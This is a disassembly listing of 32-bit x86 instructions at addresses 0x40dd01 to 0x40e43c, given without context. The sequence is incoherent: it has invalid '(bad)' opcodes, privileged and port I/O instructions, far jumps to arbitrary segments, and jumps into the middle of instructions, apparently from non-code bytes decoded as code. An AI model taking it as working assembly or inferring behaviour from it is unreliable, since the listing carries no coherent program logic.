  40dd01:	dec    edx
  40dd02:	outs   dx,DWORD PTR ds:[esi]
  40dd03:	ss adc eax,0xe9fdc797
  40dd09:	pop    DWORD PTR [eax+0x56]
  40dd0c:	call   0x5649abae
  40dd11:	cs xchg esi,eax
  40dd13:	pop    esp
  40dd14:	dec    esp
  40dd15:	cmp    esi,eax
  40dd17:	lods   al,BYTE PTR ds:[esi]
  40dd18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd19:	inc    edx
  40dd1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd1b:	add    al,0xc9
  40dd1d:	push   esp
  40dd1e:	jns    0x40dd9d
  40dd20:	sti    
  40dd21:	sbb    BYTE PTR [ebp+0x25d62c8],bl
  40dd27:	retf   
  40dd28:	or     ah,BYTE PTR [edx+edi*1+0x62]
  40dd2c:	das    
  40dd2d:	cmp    DWORD PTR [esi+0x11b96654],edx
  40dd33:	jae    0x40dd34
  40dd35:	mov    al,0xd8
  40dd37:	adc    ah,BYTE PTR [edi-0x1a5ef91f]
  40dd3d:	in     eax,0x8b
  40dd3f:	popf   
  40dd40:	arpl   bx,di
  40dd42:	(bad)  
  40dd43:	mov    dh,0xdf
  40dd45:	add    BYTE PTR [edx+0x5c],al
  40dd48:	adc    BYTE PTR [ebx-0x3a],dl
  40dd4b:	xor    ecx,ebx
  40dd4d:	rol    BYTE PTR [esi-0x765c3730],cl
  40dd53:	loop   0x40dd79
  40dd55:	xor    al,BYTE PTR [ecx-0x24fcf62b]
  40dd5b:	mov    esp,0x5d497afd
  40dd60:	push   edi
  40dd61:	not    DWORD PTR [ecx-0x701339be]
  40dd67:	pop    ebp
  40dd68:	repz mov ds:0xa5774894,eax
  40dd6e:	sub    ebx,edx
  40dd70:	mov    ecx,0xbd93209a
  40dd75:	or     eax,DWORD PTR [esi]
  40dd77:	retf   
  40dd78:	shl    DWORD PTR [ebx],cl
  40dd7a:	fld    QWORD PTR [edi-0x70]
  40dd7d:	dec    ecx
  40dd7e:	loope  0x40dd19
  40dd80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd81:	xchg   ebx,eax
  40dd82:	sub    esp,DWORD PTR [ebx-0x42c3c180]
  40dd88:	mov    ds:0x40638c67,eax
  40dd8d:	repz call 0x2d8c923
  40dd93:	outs   dx,BYTE PTR ds:[esi]
  40dd94:	push   edi
  40dd95:	add    eax,0x26cdf164
  40dd9a:	ret    0x900
  40dd9d:	inc    ebp
  40dd9e:	clc    
  40dd9f:	cmp    ch,BYTE PTR [ebx]
  40dda1:	call   0x104c0e3d
  40dda6:	das    
  40dda7:	dec    esp
  40dda8:	aad    0x3c
  40ddaa:	mov    esp,0x9a2adf7f
  40ddaf:	push   es
  40ddb0:	or     edi,esi
  40ddb2:	pop    ss
  40ddb3:	mov    bl,0x2c
  40ddb5:	sub    bh,BYTE PTR [edi]
  40ddb7:	mov    al,ds:0x7a0210d4
  40ddbc:	sbb    eax,0x4636ffa8
  40ddc1:	push   cs
  40ddc2:	scas   eax,DWORD PTR es:[edi]
  40ddc3:	adc    bl,BYTE PTR [eax]
  40ddc5:	push   es
  40ddc6:	sub    al,0xf9
  40ddc8:	enter  0xb8a1,0xbd
  40ddcc:	inc    ebp
  40ddcd:	xor    DWORD PTR [eax-0x7a60862d],edx
  40ddd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddd4:	aad    0xd0
  40ddd6:	dec    esi
  40ddd7:	iret   
  40ddd8:	cwde   
  40ddd9:	(bad)  
  40ddda:	fisttp QWORD PTR [ebx]
  40dddc:	rcr    al,cl
  40ddde:	dec    esp
  40dddf:	cmp    dl,BYTE PTR [edi+0x7c]
  40dde2:	pop    ebx
  40dde3:	adc    eax,0x93553a2d
  40dde8:	push   0xc4365330
  40dded:	adc    DWORD PTR [ebp-0x4c],edi
  40ddf0:	push   ss
  40ddf1:	or     edx,DWORD PTR [esi]
  40ddf3:	clc    
  40ddf4:	sub    BYTE PTR [edi+ecx*2+0x2c624b6e],0x70
  40ddfc:	mov    gs,WORD PTR [esi-0x214c601d]
  40de02:	jbe    0x40de27
  40de04:	popf   
  40de05:	inc    ebx
  40de06:	mov    al,ds:0xa540e070
  40de0b:	add    eax,DWORD PTR [edx]
  40de0d:	daa    
  40de0e:	cmc    
  40de0f:	mov    ah,cl
  40de11:	lock xor eax,0xa9e22306
  40de17:	sti    
  40de18:	add    eax,DWORD PTR [ebx+0x4e]
  40de1b:	and    DWORD PTR [esi+0x25ddd731],0x7b
  40de22:	imul   ecx,DWORD PTR [edi-0x5dfb4e4e],0x6508bafe
  40de2c:	mov    dl,0xe2
  40de2e:	add    BYTE PTR [eax-0x12],ah
  40de31:	mov    al,ds:0x8e0d36c9
  40de36:	arpl   di,di
  40de38:	mov    ebx,gs
  40de3a:	mov    ds:0xc6ee953e,eax
  40de3f:	push   es
  40de40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de41:	out    dx,al
  40de42:	sbb    ah,ch
  40de44:	pop    ss
  40de45:	push   cs
  40de46:	inc    esi
  40de47:	lds    ebp,FWORD PTR [edi-0x25dc1f6a]
  40de4d:	adc    ch,bh
  40de4f:	xor    eax,0x6bc913db
  40de54:	xor    BYTE PTR [ecx-0x27322ee2],ch
  40de5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de5b:	in     eax,dx
  40de5c:	jne    0x40de60
  40de5e:	loopne 0x40de94
  40de60:	adc    bl,ah
  40de62:	aam    0x1a
  40de64:	les    ebp,FWORD PTR [edx]
  40de66:	into   
  40de67:	xchg   DWORD PTR es:[ecx],ebp
  40de6a:	test   DWORD PTR [esi-0x7ca85ac8],esi
  40de70:	adc    dh,ch
  40de72:	iret   
  40de73:	sub    BYTE PTR [edx+ebx*4-0x2c00d6ab],ch
  40de7a:	push   esi
  40de7b:	or     al,bh
  40de7d:	pop    edx
  40de7e:	add    esp,DWORD PTR [edx-0x6682f54e]
  40de84:	sub    edi,eax
  40de86:	fisubr DWORD PTR ds:0xd9e89c94
  40de8c:	retf   0xb4b4
  40de8f:	shr    BYTE PTR [edi-0x4a],cl
  40de92:	or     al,ah
  40de94:	lds    edi,FWORD PTR [ebx-0x3d]
  40de97:	lea    eax,[ecx-0x3d053631]
  40de9d:	cs push ebx
  40de9f:	call   0x951d:0xedf83273
  40dea6:	sbb    DWORD PTR [ecx],ebx
  40dea8:	das    
  40dea9:	int    0x11
  40deab:	cmp    BYTE PTR [eax-0x4f405b70],bl
  40deb1:	jb     0x40de50
  40deb3:	and    bh,BYTE PTR [ebx+0x4a5824ba]
  40deb9:	jns    0x40de5e
  40debb:	xchg   BYTE PTR [ebx],dh
  40debd:	hlt    
  40debe:	or     cl,ch
  40dec0:	mov    al,ds:0xbb70a900
  40dec5:	xor    esp,DWORD PTR [ecx-0x6e9de8b4]
  40decb:	ret    
  40decc:	xchg   ecx,eax
  40decd:	jb     0x40df4c
  40decf:	push   edx
  40ded0:	daa    
  40ded1:	add    al,0x91
  40ded3:	xor    DWORD PTR [esi+0x52f9dbcb],0x84e88fb9
  40dedd:	scas   al,BYTE PTR es:[edi]
  40dede:	pop    esi
  40dedf:	test   al,0x44
  40dee1:	add    dl,BYTE PTR [edi+0xf182520]
  40dee7:	xchg   BYTE PTR [edx+0x8],dl
  40deea:	stos   DWORD PTR es:[edi],eax
  40deeb:	dec    esi
  40deec:	ficom  WORD PTR [ecx-0x7b]
  40deef:	in     eax,0x56
  40def1:	data16 jo 0x40ded1
  40def4:	ds nop
  40def6:	jle    0x40deab
  40def8:	jg     0x40df53
  40defa:	xchg   ebp,eax
  40defb:	loope  0x40df4f
  40defd:	loope  0x40df05
  40deff:	sbb    al,0xc0
  40df01:	jno    0x40dec6
  40df03:	out    dx,al
  40df04:	lahf   
  40df05:	leave  
  40df06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df07:	nop
  40df08:	mov    dh,0xed
  40df0a:	faddp  st(7),st
  40df0c:	pop    esi
  40df0d:	dec    ebx
  40df0e:	cmp    ebp,DWORD PTR [esi]
  40df10:	test   al,0xe2
  40df12:	inc    ebx
  40df13:	scas   eax,DWORD PTR es:[edi]
  40df14:	mov    dh,0x4a
  40df16:	pop    ss
  40df17:	stc    
  40df18:	(bad)  
  40df19:	repz jns 0x40de9e
  40df1c:	into   
  40df1d:	dec    ecx
  40df1e:	das    
  40df1f:	adc    esp,DWORD PTR [esi-0x6d]
  40df22:	pop    eax
  40df23:	cmp    BYTE PTR [edi],dl
  40df25:	xor    al,0x1a
  40df27:	data16 icebp 
  40df29:	mov    ds,WORD PTR [edi+eiz*2]
  40df2c:	dec    ebp
  40df2d:	fidivr WORD PTR [ebx*4-0x7c3de172]
  40df34:	jne    0x40dfa8
  40df36:	pop    esp
  40df37:	inc    edx
  40df38:	jae    0x40df38
  40df3a:	inc    esp
  40df3b:	jge    0x40def8
  40df3d:	ret    0x3990
  40df40:	push   ecx
  40df41:	jo     0x40df62
  40df43:	jecxz  0x40df0f
  40df45:	ja     0x40df0e
  40df47:	aad    0x6b
  40df49:	pop    ecx
  40df4a:	xor    BYTE PTR [bx+si],bh
  40df4d:	push   ds
  40df4e:	outs   dx,BYTE PTR ds:[esi]
  40df4f:	and    DWORD PTR [ecx-0x44],ebp
  40df52:	outs   dx,BYTE PTR ds:[esi]
  40df53:	bswap  ebx
  40df55:	jbe    0x40df2d
  40df57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df58:	fsub   QWORD PTR [ebx-0x21]
  40df5b:	outs   dx,BYTE PTR ds:[esi]
  40df5c:	dec    eax
  40df5d:	or     al,0x51
  40df5f:	inc    edx
  40df60:	push   ss
  40df61:	and    eax,0x37f148e
  40df66:	call   0xe174a04e
  40df6b:	outs   dx,DWORD PTR ds:[esi]
  40df6c:	pop    ds
  40df6d:	shr    BYTE PTR ds:0x31b27202,0x28
  40df74:	xor    al,0x21
  40df76:	fmul   QWORD PTR [edi-0x1e]
  40df79:	mov    DWORD PTR [ebp-0x6eee8f97],edi
  40df7f:	sub    al,BYTE PTR [eax+0x31]
  40df82:	xor    eax,0xc605f054
  40df87:	cli    
  40df88:	test   DWORD PTR [esp+eax*1],0xd5778c8a
  40df8f:	je     0x40df8a
  40df91:	or     BYTE PTR [ecx+0x74],ch
  40df94:	inc    edi
  40df95:	pushf  
  40df96:	daa    
  40df97:	sub    eax,0x5b79d9ae
  40df9c:	mov    ah,0x74
  40df9e:	jb     0x40dfc4
  40dfa0:	dec    ebx
  40dfa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfa2:	sbb    BYTE PTR [ecx-0x5ef19441],al
  40dfa8:	jmp    0x40df2a
  40dfaa:	cmp    eax,0xb6831bac
  40dfaf:	test   al,0xb8
  40dfb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfb2:	mov    ch,0x9
  40dfb4:	jmp    0x8dba:0xadb44947
  40dfbb:	int    0x84
  40dfbd:	lods   al,BYTE PTR ds:[esi]
  40dfbe:	mov    bl,0x27
  40dfc0:	bound  edx,QWORD PTR [ebx-0x33]
  40dfc3:	pop    ebx
  40dfc4:	(bad)  
  40dfc5:	push   ss
  40dfc6:	shr    DWORD PTR [ebp+0x384f5c9],1
  40dfcc:	jno    0x40e026
  40dfce:	arpl   WORD PTR es:[ebx],cx
  40dfd1:	sub    eax,0xcf1faabf
  40dfd6:	push   eax
  40dfd7:	leave  
  40dfd8:	xchg   ebx,edi
  40dfda:	inc    ecx
  40dfdb:	and    eax,0x9b47ee12
  40dfe0:	ds pop ss
  40dfe2:	push   0x33
  40dfe4:	mov    edi,DWORD PTR [edx]
  40dfe6:	mov    dl,BYTE PTR [edi]
  40dfe8:	and    DWORD PTR [esi-0x3d407200],ebx
  40dfee:	ret    0x2fc6
  40dff1:	cmp    eax,edx
  40dff3:	in     eax,dx
  40dff4:	adc    BYTE PTR [ebx],cl
  40dff6:	stos   BYTE PTR es:[edi],al
  40dff7:	les    edx,FWORD PTR [edi]
  40dff9:	or     eax,0x9825f44a
  40dffe:	fst    DWORD PTR [esi]
  40e000:	test   dh,cl
  40e002:	imul   edi
  40e004:	pop    DWORD PTR [edi]
  40e006:	lds    edx,FWORD PTR [esi]
  40e008:	mov    cl,0x16
  40e00a:	lods   al,BYTE PTR ds:[esi]
  40e00b:	or     al,ch
  40e00d:	pop    edx
  40e00e:	ja     0x40dfda
  40e010:	icebp  
  40e011:	xchg   edi,eax
  40e012:	sub    edi,DWORD PTR [ecx-0x28]
  40e015:	stos   BYTE PTR es:[edi],al
  40e016:	or     al,0xd6
  40e018:	loopne 0x40dfaa
  40e01a:	mov    dh,0x72
  40e01c:	jae    0x40e067
  40e01e:	(bad)  
  40e01f:	pop    ecx
  40e020:	jecxz  0x40dfb3
  40e022:	inc    ebp
  40e023:	xchg   esi,eax
  40e024:	xchg   DWORD PTR [ebx],ebp
  40e026:	jnp    0x40e031
  40e028:	gs pop ss
  40e02a:	out    dx,al
  40e02b:	dec    eax
  40e02c:	xchg   esi,eax
  40e02d:	repnz mov edx,0x428cb19d
  40e033:	mov    edx,0xb61977a9
  40e038:	stos   DWORD PTR es:[edi],eax
  40e039:	rcl    BYTE PTR [ebx+0x52a72837],cl
  40e03f:	pop    esi
  40e040:	jbe    0x40e01d
  40e042:	add    ch,BYTE PTR [ecx-0x71b7bd74]
  40e048:	mov    DWORD PTR ds:0x1962704d,esp
  40e04e:	xchg   edx,eax
  40e04f:	cwde   
  40e050:	and    BYTE PTR [eax-0x72],0x1a
  40e054:	or     dl,0x6e
  40e057:	add    DWORD PTR [eax+0x38],ebp
  40e05a:	(bad)
  40e05d:	sar    DWORD PTR [edi],cl
  40e05f:	xor    dl,bl
  40e061:	xlat   BYTE PTR ds:[ebx]
  40e062:	xchg   DWORD PTR [edi+0x891615d],ebx
  40e068:	add    ebp,esi
  40e06a:	xchg   BYTE PTR [esi+0x52fd7998],cl
  40e070:	daa    
  40e071:	loope  0x40e067
  40e073:	xor    dh,ah
  40e075:	fnsetpm(287 only) 
  40e077:	or     eax,0xc8228f81
  40e07c:	xchg   BYTE PTR [esi+0x4d836b3d],ah
  40e082:	or     ebp,0x7f
  40e085:	mov    ebp,fs
  40e087:	loop   0x40e050
  40e089:	outs   dx,BYTE PTR ds:[esi]
  40e08a:	mov    gs,WORD PTR [eax+0x28]
  40e08d:	jns    0x40e0d0
  40e08f:	pop    esi
  40e090:	test   BYTE PTR [ebx-0x67],dh
  40e093:	mov    al,0x9f
  40e095:	sub    al,0x7d
  40e097:	cmp    BYTE PTR [ebx],0x70
  40e09a:	and    ebp,DWORD PTR [ecx]
  40e09c:	xchg   esi,eax
  40e09d:	stc    
  40e09e:	(bad)  
  40e09f:	fstp   DWORD PTR [ecx+ebx*1+0xb]
  40e0a3:	stc    
  40e0a4:	sbb    al,0xb1
  40e0a6:	pusha  
  40e0a7:	push   es
  40e0a8:	jecxz  0x40e082
  40e0aa:	dec    edx
  40e0ab:	adc    edi,DWORD PTR [ebx+0x594e63bf]
  40e0b1:	je     0x40e03f
  40e0b3:	mov    ebp,DWORD PTR [edx]
  40e0b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0b6:	loope  0x40e08e
  40e0b8:	xor    al,0x55
  40e0ba:	or     al,0x7b
  40e0bc:	jmp    0x2dbd:0x6f504da3
  40e0c3:	push   0x47
  40e0c5:	hlt    
  40e0c6:	iret   
  40e0c7:	fcmovnu st,st(1)
  40e0c9:	xchg   esi,eax
  40e0ca:	jmp    0x893a7c7
  40e0cf:	ret    
  40e0d0:	jo     0x40e09f
  40e0d2:	iret   
  40e0d3:	popf   
  40e0d4:	out    0xf,al
  40e0d6:	pop    esi
  40e0d7:	adc    al,0x24
  40e0d9:	push   edi
  40e0da:	push   ds
  40e0db:	(bad)  
  40e0dc:	sbb    esp,DWORD PTR [esi-0x30766a3c]
  40e0e2:	ret    0x9739
  40e0e5:	mov    cl,BYTE PTR [edx]
  40e0e7:	sub    ecx,DWORD PTR [edi-0x2b]
  40e0ea:	bound  eax,QWORD PTR [edx]
  40e0ec:	je     0x40e106
  40e0ee:	rcl    BYTE PTR [ecx+0x17],1
  40e0f1:	pop    ss
  40e0f2:	push   ebx
  40e0f3:	mov    ch,0xf
  40e0f5:	sar    DWORD PTR [eax-0x70],0xfc
  40e0f9:	je     0x40e0e3
  40e0fb:	pop    edi
  40e0fc:	mov    edi,0x5a440752
  40e101:	aad    0xa8
  40e103:	pop    ds
  40e104:	or     ecx,0xd29dc9e3
  40e10a:	push   0x1a
  40e10c:	mov    dh,0xc0
  40e10e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e10f:	xchg   BYTE PTR [edx-0x6c],ah
  40e112:	test   ah,dh
  40e114:	popf   
  40e115:	(bad)  
  40e116:	cmp    DWORD PTR [eax+0x2649b543],edi
  40e11c:	xor    cl,al
  40e11e:	aas    
  40e11f:	sub    BYTE PTR [eax+esi*1],bl
  40e122:	stc    
  40e123:	cmp    BYTE PTR [eax+0x5b],0xa4
  40e127:	xchg   DWORD PTR [ecx+0x5b],eax
  40e12a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e12b:	cli    
  40e12c:	jl     0x40e0cd
  40e12e:	dec    edx
  40e12f:	add    eax,0xf4f241a9
  40e134:	popf   
  40e135:	ficom  DWORD PTR [ecx+0xdedb9ec]
  40e13b:	push   ss
  40e13c:	xlat   BYTE PTR ds:[ebx]
  40e13d:	fst    QWORD PTR [esi-0x7]
  40e140:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e141:	cwde   
  40e142:	cwde   
  40e143:	adc    DWORD PTR [ebp+0xc15ed72],ebp
  40e149:	jbe    0x40e113
  40e14b:	pop    ebx
  40e14c:	adc    eax,0x6ac44517
  40e151:	dec    esp
  40e152:	push   edx
  40e153:	add    edi,ebx
  40e155:	jb     0x40e138
  40e157:	popf   
  40e158:	jmp    0xfba56824
  40e15d:	add    al,ch
  40e15f:	or     DWORD PTR [ecx-0x28],ebp
  40e162:	iret   
  40e163:	int    0xca
  40e165:	sub    BYTE PTR [ecx],bh
  40e167:	ret    
  40e168:	rcl    DWORD PTR [esi-0x2e959665],cl
  40e16e:	gs add al,0xab
  40e171:	cli    
  40e172:	mov    BYTE PTR ds:0xfd2eeb9e,bl
  40e178:	(bad)  
  40e179:	outs   dx,BYTE PTR ds:[esi]
  40e17a:	jge    0x40e151
  40e17c:	cld    
  40e17d:	sbb    DWORD PTR [edi-0x17],ebp
  40e180:	xor    eax,0xfc23a47e
  40e185:	out    0x31,eax
  40e187:	ja     0x40e1eb
  40e189:	pop    esi
  40e18a:	dec    edx
  40e18b:	pusha  
  40e18c:	jge    0x40e128
  40e18e:	stos   BYTE PTR es:[edi],al
  40e18f:	jne    0x40e183
  40e191:	mov    ah,0xb5
  40e193:	ror    BYTE PTR [esi-0x6b],1
  40e196:	cmp    eax,0x23b0e793
  40e19b:	das    
  40e19c:	inc    eax
  40e19d:	out    0xdc,eax
  40e19f:	cmp    ah,dh
  40e1a1:	leave  
  40e1a2:	push   ecx
  40e1a3:	xchg   ecx,eax
  40e1a4:	mov    ecx,0x464ecd1a
  40e1a9:	clc    
  40e1aa:	cmp    esi,DWORD PTR [ebx+0x526ec3ec]
  40e1b0:	push   0xffffffd1
  40e1b2:	mov    al,ds:0xc38df307
  40e1b7:	fnsave [edi-0x38]
  40e1ba:	mov    al,ds:0x90bb4ec
  40e1bf:	hlt    
  40e1c0:	aaa    
  40e1c1:	aam    0x20
  40e1c3:	bound  eax,QWORD PTR [edx]
  40e1c5:	adc    eax,0x8395f390
  40e1ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1cb:	fisub  DWORD PTR [eax+0x48e72cb7]
  40e1d1:	cdq    
  40e1d2:	les    ebp,FWORD PTR [edi]
  40e1d4:	(bad)  
  40e1d5:	xchg   esi,eax
  40e1d6:	inc    esp
  40e1d7:	idiv   DWORD PTR [edi+0x7d744a9a]
  40e1dd:	mov    ecx,0x1dcd5a8
  40e1e2:	sub    DWORD PTR ds:0xc0b18e57,esp
  40e1e8:	and    dl,BYTE PTR [edx+0x5497a02]
  40e1ee:	ud0    esi,DWORD PTR [ecx-0x69f2c6f2]
  40e1f5:	inc    edx
  40e1f6:	xor    BYTE PTR [edx],0x67
  40e1f9:	imul   ebp,DWORD PTR [ebx+0x6d],0x51
  40e1fd:	ja     0x40e1f1
  40e1ff:	xor    ebp,edx
  40e201:	push   ebx
  40e202:	push   ebx
  40e203:	sub    BYTE PTR [ebx+edi*4+0x76],cl
  40e207:	jae    0x40e1ef
  40e209:	mov    ecx,0xcfa81bf1
  40e20e:	pop    esp
  40e20f:	dec    esi
  40e210:	sahf   
  40e211:	ins    DWORD PTR es:[edi],dx
  40e212:	outs   dx,BYTE PTR ds:[esi]
  40e213:	jo     0x40e1e8
  40e215:	stos   BYTE PTR es:[edi],al
  40e216:	jecxz  0x40e272
  40e218:	adc    al,0xfa
  40e21a:	push   ds
  40e21b:	loopne 0x40e200
  40e21d:	and    ch,ch
  40e21f:	dec    edi
  40e220:	adc    BYTE PTR [ebx],ch
  40e222:	in     eax,0xc
  40e224:	fdivr  QWORD PTR [eax-0x4ab3bb3b]
  40e22a:	sbb    DWORD PTR [edi-0x50],ebp
  40e22d:	ins    BYTE PTR es:[edi],dx
  40e22e:	das    
  40e22f:	cmp    eax,0x8e4c61af
  40e234:	push   ss
  40e235:	mov    ecx,0xcaad5a98
  40e23a:	add    bh,BYTE PTR [eax-0x28]
  40e23d:	inc    ecx
  40e23e:	xchg   ebx,eax
  40e23f:	ins    BYTE PTR es:[edi],dx
  40e240:	gs mov eax,0x32e38421
  40e246:	mov    dh,0x2e
  40e248:	or     ah,BYTE PTR [ecx-0x1b]
  40e24b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e24c:	aad    0x76
  40e24e:	sbb    bl,0xcf
  40e251:	add    esi,edi
  40e253:	shr    ch,cl
  40e255:	inc    eax
  40e256:	jmp    0x633cf78
  40e25b:	stos   DWORD PTR es:[edi],eax
  40e25c:	enter  0x9767,0x16
  40e260:	mov    ebx,0x39669b45
  40e265:	pop    ebx
  40e266:	inc    ecx
  40e267:	les    ebx,FWORD PTR [ebx+0x20]
  40e26a:	or     edx,0x22f89e9e
  40e270:	fld1   
  40e272:	mov    ds:0x837f0e1b,eax
  40e277:	lock or BYTE PTR [edi],ah
  40e27a:	sub    eax,0x5131b53c
  40e27f:	(bad)  
  40e280:	mov    ebp,0xff72646
  40e285:	pop    esp
  40e286:	test   al,0xce
  40e288:	les    ebp,FWORD PTR [esi+0x67]
  40e28b:	into   
  40e28c:	lods   al,BYTE PTR ds:[esi]
  40e28d:	mov    ebx,0x92729fa8
  40e292:	ins    BYTE PTR es:[edi],dx
  40e293:	jg     0x40e2ec
  40e295:	adc    BYTE PTR [ebx+0x7e],ch
  40e298:	jmp    0x9320:0xbe06a67e
  40e29f:	xchg   ebp,eax
  40e2a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2a1:	and    eax,0xa2757a31
  40e2a6:	cmp    WORD PTR [ecx],0x3b
  40e2aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2ab:	aaa    
  40e2ac:	ins    DWORD PTR es:[edi],dx
  40e2ad:	jmp    0x40e28a
  40e2af:	sbb    eax,DWORD PTR [esp+esi*1+0x24]
  40e2b3:	fisubr DWORD PTR [ebx]
  40e2b5:	in     eax,dx
  40e2b6:	test   DWORD PTR [eax+ebp*2+0x4f2b23f4],0x470ac818
  40e2c1:	stc    
  40e2c2:	mov    dh,dh
  40e2c4:	out    dx,eax
  40e2c5:	mov    ch,0x51
  40e2c7:	mov    edi,DWORD PTR [edx-0x40af7d52]
  40e2cd:	(bad)  
  40e2ce:	scas   eax,DWORD PTR es:[edi]
  40e2cf:	push   0x9ddc5d3a
  40e2d4:	add    BYTE PTR [edx+0x5d],ah
  40e2d7:	ds out 0x3d,eax
  40e2da:	pop    ebx
  40e2db:	xchg   BYTE PTR [ecx],cl
  40e2dd:	dec    ebp
  40e2de:	cmp    esi,DWORD PTR [ebp+ecx*2-0x2d]
  40e2e2:	and    esp,0xaf1b4cb6
  40e2e8:	jg     0x40e308
  40e2ea:	adc    eax,0xffe51c1
  40e2ef:	sar    DWORD PTR [edx],0xf2
  40e2f2:	mov    gs:0x5ea1e78a,eax
  40e2f8:	aam    0x2c
  40e2fa:	jmp    0x40e36c
  40e2fc:	out    0xb7,eax
  40e2fe:	sub    BYTE PTR [esi-0xc8ef07c],bl
  40e304:	mov    ds:0x599890d7,al
  40e309:	ins    BYTE PTR es:[edi],dx
  40e30a:	push   ss
  40e30b:	xlat   BYTE PTR ds:[ebx]
  40e30c:	add    BYTE PTR [esi+0x28e93962],al
  40e312:	pop    esi
  40e313:	jbe    0x40e348
  40e315:	aaa    
  40e316:	ja     0x40e2d4
  40e318:	xor    ebp,DWORD PTR [eax-0x1c]
  40e31b:	inc    edi
  40e31c:	mov    cl,ch
  40e31e:	and    eax,0x641f9af6
  40e323:	pop    edx
  40e324:	loop   0x40e398
  40e326:	addr16 clc 
  40e328:	das    
  40e329:	popa   
  40e32a:	jo     0x40e397
  40e32c:	xchg   BYTE PTR [ebx+0x4],ch
  40e32f:	loop   0x40e337
  40e331:	je     0x40e34c
  40e333:	idiv   bh
  40e335:	sub    al,0xcc
  40e337:	test   ah,0x52
  40e33a:	in     al,dx
  40e33b:	imul   edi,edi,0x7d
  40e33e:	pop    edx
  40e33f:	and    BYTE PTR [ebx+0x31],dl
  40e342:	pusha  
  40e343:	pop    esp
  40e344:	push   eax
  40e345:	add    bl,dl
  40e347:	ins    WORD PTR es:[edi],dx
  40e349:	adc    al,0xb6
  40e34b:	sar    BYTE PTR [edi-0xf897ee1],cl
  40e351:	popa   
  40e352:	jbe    0x40e2dc
  40e354:	dec    ecx
  40e355:	(bad)  
  40e356:	(bad)  
  40e357:	cs cmp al,0x40
  40e35a:	(bad)  
  40e35b:	cmc    
  40e35c:	adc    eax,0x5b3b1337
  40e361:	arpl   WORD PTR [ecx-0x5cc7b5e2],cx
  40e367:	inc    edi
  40e368:	jae    0x40e366
  40e36a:	aad    0xeb
  40e36c:	inc    edx
  40e36d:	out    dx,al
  40e36e:	ficomp DWORD PTR [eax+0x4d]
  40e371:	gs jg  0x40e36d
  40e374:	xor    DWORD PTR [ebp+edx*4-0x1d],esp
  40e378:	inc    ebx
  40e379:	pop    edx
  40e37a:	es xchg ebp,eax
  40e37c:	lods   al,BYTE PTR ds:[esi]
  40e37d:	shl    DWORD PTR [esi+0x62],0x38
  40e381:	pop    esi
  40e382:	push   0x71
  40e384:	jns    0x40e351
  40e386:	push   0x48ea5586
  40e38b:	mov    dh,dh
  40e38d:	mov    ds:0xd5b733b7,al
  40e392:	fsubr  DWORD PTR [ecx-0x38]
  40e395:	adc    al,0x6
  40e397:	adc    DWORD PTR [esi],ebx
  40e399:	jo     0x40e345
  40e39b:	cld    
  40e39c:	outs   dx,BYTE PTR ds:[esi]
  40e39d:	retf   0x89d0
  40e3a0:	add    DWORD PTR [ebp-0x9cae224],ecx
  40e3a6:	dec    edx
  40e3a7:	mov    ebp,0x7f921faa
  40e3ac:	mov    dl,0xfb
  40e3ae:	jg     0x40e392
  40e3b0:	shl    DWORD PTR [esi-0x646c8348],0xdd
  40e3b7:	sub    al,0x51
  40e3b9:	jp     0x40e34d
  40e3bb:	pop    ds
  40e3bc:	aad    0x3
  40e3be:	test   BYTE PTR [ebx+0x2e],bl
  40e3c1:	or     DWORD PTR [ebp+0x15],edi
  40e3c4:	push   0x8b062a0c
  40e3c9:	das    
  40e3ca:	popf   
  40e3cb:	sub    ebp,DWORD PTR [esi-0x49e0d092]
  40e3d1:	dec    eax
  40e3d2:	push   cs
  40e3d3:	pop    edx
  40e3d4:	pusha  
  40e3d5:	nop
  40e3d6:	cdq    
  40e3d7:	push   0xbcf3de78
  40e3dc:	cmp    DWORD PTR [eax],0x5a891b32
  40e3e2:	addr16 fs cmp ecx,esi
  40e3e6:	loope  0x40e422
  40e3e8:	inc    ecx
  40e3e9:	or     al,BYTE PTR [ecx]
  40e3eb:	push   0x4054eb66
  40e3f0:	call   0xb78b4559
  40e3f5:	cld    
  40e3f6:	or     DWORD PTR [ecx-0x24],esi
  40e3f9:	push   ds
  40e3fa:	loopne 0x40e38c
  40e3fc:	pop    ebp
  40e3fd:	dec    esp
  40e3fe:	jne    0x40e388
  40e400:	loop   0x40e413
  40e402:	dec    eax
  40e403:	xchg   edi,ecx
  40e405:	in     eax,dx
  40e406:	pushf  
  40e407:	sub    eax,DWORD PTR [edx-0x29]
  40e40a:	or     cl,dh
  40e40c:	or     ecx,DWORD PTR [eax+0x2a]
  40e40f:	ins    BYTE PTR es:[edi],dx
  40e410:	mov    dh,0x16
  40e412:	call   0xcc9e:0xd416496a
  40e419:	cli    
  40e41a:	xchg   ebp,eax
  40e41b:	icebp  
  40e41c:	fstp   TBYTE PTR [ecx+eiz*1]
  40e41f:	sub    DWORD PTR [edx],0x1d
  40e422:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e423:	mov    esi,ebx
  40e425:	xchg   ecx,eax
  40e426:	jbe    0x40e403
  40e428:	mov    edx,0xa0dddf22
  40e42d:	jle    0x40e447
  40e42f:	jo     0x40e3ca
  40e431:	shl    ah,1
  40e433:	iret   
  40e434:	jbe    0x40e414
  40e436:	shl    BYTE PTR [ebx+0x4e],1
  40e439:	shr    ecx,0xb1
  40e43c:	fadd   DWORD PTR [esp+ecx*1-0x3e5917cc]
